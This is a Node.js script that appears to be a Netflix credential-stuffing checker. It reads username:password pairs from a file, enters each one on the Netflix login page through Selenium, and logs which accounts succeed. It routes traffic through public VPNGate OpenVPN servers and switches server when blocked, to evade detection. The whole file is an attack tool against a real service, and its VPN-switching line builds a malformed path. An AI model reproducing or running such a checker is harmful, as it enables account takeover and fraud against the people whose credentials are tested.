var exec = require("child_process").exec;
var psTree = require('ps-tree');
const {
    Builder,
    By,
    Key,
    until
} = require('selenium-webdriver');
const fs = require('fs');
const readline = require('readline');


ovpnProcess = exec(`openvpn --config ./ipvanish/vpngate_public-vpn-64.opengw.net_udp_1195.ovpn`);
function changevpn(next)
{
    console.log('changing vpn to '+next);
    ovpnProcess = exec(`openvpn --config ./ipvanish/'+${next}+'.ovpn`);
}
ovpnProcess.stdout.on('data', function(data) {
    console.log('stdout: ' + data);
    if(data.match('Initialization Sequence Completed'))
    {
        console.log("vpn connected now calling automation")
        processLineByLine();
      
    }
});
ovpnProcess.stderr.on('data', function(data) {
    console.log('stdout: ' + data);
   
});
ovpnProcess.on('close', function(code) {
    console.log('closing code: ' + code);
});

var kill = function (pid, signal, callback) {
    signal   = signal || 'SIGKILL';
    callback = callback || function () {};
    var killTree = true;
    if(killTree) {
        psTree(pid, function (err, children) {
            [pid].concat(
                children.map(function (p) {
                    return p.PID;
                })
            ).forEach(function (tpid) {
                try { process.kill(tpid, signal) }
                catch (ex) { }
            });
            callback();
        });
    } else {
        try { process.kill(pid, signal) }
        catch (ex) { }
        callback();
    }
};

async function processLineByLine() {
    const fileStream = fs.createReadStream('input.txt');

    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });
    for await (const line of rl) {
        var credarr = line.split(':')
        await automate(credarr[0], credarr[1])
    }
}

async function automate(username, password) {
    let driver = await new Builder().forBrowser('chrome').build();
    try {
        await driver.get('https://www.netflix.com/in/login');
        //id_userLoginId
        await driver.findElement(By.name('userLoginId')).sendKeys(username, Key.TAB);
        await driver.findElement(By.name('password')).sendKeys(password, Key.RETURN);
        
        setTimeout(async function () {
            var currenturl = (await driver.getCurrentUrl()).toString();
            //console.log("currenturl : " + JSON.stringify(currenturl));
            if (currenturl == 'https://www.netflix.com/browse') {
                console.log('success for ' + username);
            } else {
                console.log('failed for ' + username)
            }
        }, 3000)

    }catch (e) {
        if (e.name === 'NoSuchElementError')
         {
            //close vpn and change vpn
                console.log('closing vpn connection');
            var isWin = /^win/.test(ovpnProcess.platform);
            if(!isWin) {
                kill(ovpnProcess.pid);
                changevpn('vpngate_public-vpn-56.opengw.net_udp_1195')
            } else {
            var cp = require('child_process');
                    cp.exec('taskkill /PID ' + ovpnProcess.pid + ' /T /F', function (error, stdout, stderr) {
                        // more debug if you need
                         console.log('stdout: ' + stdout);
                         console.log('stderr: ' + stderr);
                        if(error !== null) {
                             console.log('exec error: ' + error);
                        }
                    });
                }
         }
      } finally {
        await driver.sleep(3500)
        await driver.quit();
    }
};